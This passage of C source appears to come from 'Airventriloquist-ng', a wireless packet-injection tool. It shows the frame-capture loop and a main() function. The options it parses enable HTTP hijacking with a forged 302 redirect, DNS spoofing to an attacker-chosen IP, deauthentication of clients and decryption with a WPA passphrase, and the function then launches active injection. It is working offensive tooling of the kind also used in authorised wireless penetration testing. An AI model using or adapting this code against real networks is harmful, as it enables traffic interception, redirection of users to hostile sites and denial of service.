        wi_get_mac(_wi_in, dev.mac_in);
        printf("\n");
    }
    else if(opt.s_face && opt.port_in <= 0)
    {
        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        printf("\n");
        dev.fd_out = wi_fd(_wi_out);
        wi_get_mac(_wi_out, dev.mac_out);

        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
        printf("s_face, port_in\n");
    }

    if(opt.port_in <= 0)
    {
        /* avoid blocking on reading the socket */
        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }
    }

    if(getnet(NULL, 0, 0) != 0)
        return 1;

    srand( time( NULL ) );
    // Set our bitrate to the loudest/most likely to reach the station/AP...
    set_bitrate(_wi_out, RATE_1M);

    // main Loop
    while( 1 )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        tv.tv_sec  = 0;
        tv.tv_usec = 1000; // one millisecond

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
        {
            if( errno == EINTR ) continue;
            perror( "select failed" );
            return( 1 );
        }
        if( ! FD_ISSET( dev.fd_in, &rfds ) )
            continue;

        memset(h80211, 0, sizeof(h80211));
        caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        // Ignore small frames...
        if(caplen <= 30) continue;

        // Check for 802.11 data frame, first byte is FC
        if( (IEEE80211_FC0_TYPE_DATA & h80211[0]) )
        {
            process_wireless_packet(h80211,caplen);
        }

    }

}

int main( int argc, char *argv[] )
{
    int option = 0;
    int option_index = 0;

    memset( &dev, 0, sizeof( dev ) );
    memset( &opt, 0, sizeof( struct options ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = -1; opt.f_maxlen    = -1;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1; 

    opt.a_mode    = -1; opt.deauth      =  0; 
    opt.delay     = 15; opt.r_smac_set  =  0;
    opt.npackets  =  1; 
    opt.rtc       =  1; opt.f_retry =  0;
    opt.reassoc   =  0;
    opt.s_face    =  NULL; 
    opt.iface_out =  NULL;
    opt.p_hijack_str = NULL;
    opt.flag_verbose     = 0;
    opt.flag_icmp_resp   = 0;
    opt.flag_http_hijack = 0;
    opt.flag_dnsspoof    = 0;

    char *p_redir_url = NULL;

    progname = getVersion("Airventriloquist-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);

    while( 1 )
    {

        option_index = 0;
        static struct option long_options[] = {
            {"redirect",   1, 0, 'r'},
            {"interface",  1, 0, 'i'},
            {"hijack",     1, 0, 's'},
            {"passphrase", 1, 0, 'p'},
            {"essid",      1, 0, 'e'},
            {"deauth",     0, 0, 'd'},
            {"icmp",       0, 0, 'c'},
            {"dns",        1, 0, 'n'},
            {"verbose",    0, 0, 'v'},
            {"help",       0, 0, 'h'},
            {0,            0, 0,  0 }
        };

        option = getopt_long( argc, argv,
                        "i:n:r:s:p:e:dcv",
                        long_options, &option_index );

        if( option < 0 ) break;

        switch( option )
        {
            case 0 :
                break;

            case 'i':
                printf("Selected Interface is %s\n",optarg);
                opt.s_face = opt.iface_out = optarg;
                opt.port_in = get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in)-1);
                opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);
                break;

            case 'v':
                printf("Verbose enabled\n");
                opt.flag_verbose = 1;
                break;

            case 'd':
                printf("Deauthing enabled\n");
                opt.deauth = 1;
                break;

            case 'c':
                printf("Debugging by responding to ICMP enabled\n");
                opt.flag_icmp_resp = 1;
                break;

            case 'r':
                printf("Redirect: %s\n",optarg);
                p_redir_url = optarg;
                break;

            case 'n':
                printf("DNS IP: %s\n",optarg);
                int retval = inet_pton(AF_INET, optarg, &opt.p_dnsspoof_ip);
                if (1 != retval)
                {
                    printf("Error occurred converting IP, please specify a valid IP, because apparently %s is not\n", optarg);
                    free(progname);
                    return EXIT_FAILURE;
                }
                opt.flag_dnsspoof = 1;
                break;

            case 's':
                printf("Hijack search term: %s\n",optarg);
                opt.p_hijack_str = optarg;
                opt.flag_http_hijack = 1;
                break;

            case 'e' :
                if ( opt.essid[0])
                {
                    printf( "ESSID already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    free(progname);
                    return EXIT_FAILURE;
                }

                memset(  opt.essid, 0, sizeof( opt.essid ) );
                strncpy( opt.essid, optarg, sizeof( opt.essid ) - 1 );
                break;

            case 'p' :
                if( opt.crypt != CRYPT_NONE )
                {
                    printf( "Encryption key already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    free(progname);
                    return EXIT_FAILURE;
                }

                opt.crypt = CRYPT_WPA;

                memset(  opt.passphrase, 0, sizeof( opt.passphrase ) );
                strncpy( opt.passphrase, optarg, sizeof( opt.passphrase ) - 1 );
                break;

            case 'h' :
                printf(usage, progname);
		free(progname);
                return EXIT_SUCCESS;

            default:
                //intentional fall through
            case ':':
                printf("\"%s --help\" for help.\n", argv[0]);

        }
    }

    if( opt.crypt == CRYPT_WPA )
    {
        if( opt.passphrase[0] != '\0' )
        {
            /* compute the Pairwise Master Key */

            if( opt.essid[0] == '\0' )
            {
                printf( "You must also specify the ESSID (-e). This is the broadcast SSID name\n" );
                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );
            }

            calc_pmk( opt.passphrase, opt.essid, opt.pmk );
        }
    }

    if(1 == opt.flag_http_hijack){

        if(NULL != opt.p_hijack_str)
        {
            printf("hijack string = %s\n", opt.p_hijack_str);
        }
        else
        {
            printf("ERROR: No proper hijack string defined\n");
        }

        if(NULL != p_redir_url)
        {
            opt.p_redir_url = p_redir_url;

            printf("We have a redirect specified\n");
            char *p_url = strstr(packet302_redirect,REDIRECT_PLACEHOLDER);

            int total_len = strlen(packet302_redirect) - strlen(REDIRECT_PLACEHOLDER) + strlen(p_redir_url);

            //Allocate memory if we're modifying this 
            opt.p_redir_pkt_str = malloc(total_len);
            if(opt.p_redir_pkt_str != NULL)
            {
                char *p_curr = opt.p_redir_pkt_str;
                int len_first = p_url - packet302_redirect;
                //Copy the first part of the packet up to the URL in the header
                memcpy(p_curr, packet302_redirect, len_first);

                //Next copy the specified redirection URL from user input
                p_curr = opt.p_redir_pkt_str + len_first;
                memcpy(p_curr, p_redir_url, strlen(p_redir_url));

                //Copy the remainder of the packet...
                p_curr += strlen(p_redir_url);
                memcpy(p_curr, p_url + strlen(REDIRECT_PLACEHOLDER), total_len - len_first - strlen(p_redir_url));
            }
            else
            {
                printf("ERROR: wasn't able to allocate the memory needed to do redirect... \n");
                exit(1);
            }

        } else {
            printf("WARNING: \n\tHijack term specified but no redirect specified\n");
            printf("\tUsing the default redirect specified\n");
            //Using default redirect in the hardcoded header.... 
            opt.p_redir_pkt_str = packet302_redirect;
        }
    }

    if(opt.s_face == NULL)
    {
        printf(usage, progname);
        free(progname);
        printf(COL_RED "Error, a interface must be specified\n\n" COL_REST);
        return EXIT_FAILURE;
    }

    /* drop privileges */
    if (setuid( getuid() ) == -1) {
        perror("setuid");
    }

    /* XXX */
    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }

    /*
       random source so we can identify our packets
    */
    opt.r_smac[0] = 0x00;
    opt.r_smac[1] = rand() & 0xFF;
    opt.r_smac[2] = rand() & 0xFF;
    opt.r_smac[3] = rand() & 0xFF;
    opt.r_smac[4] = rand() & 0xFF;
    opt.r_smac[5] = rand() & 0xFF;

    opt.r_smac_set=1;

    //if there is no -h given, use default hardware mac

    if( maccmp( opt.r_smac, NULL_MAC) == 0 )
    {
        memcpy( opt.r_smac, dev.mac_out, 6);
        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
        {
            printf("No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
                   dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
        }
        printf("Using device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
               dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
    }

    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)
    {
        fprintf( stderr, "The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
                 " doesn't match the specified MAC (-h).\n"
                 "\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],
                 opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
    }

   return( do_active_injection() );

    //return 1;
}
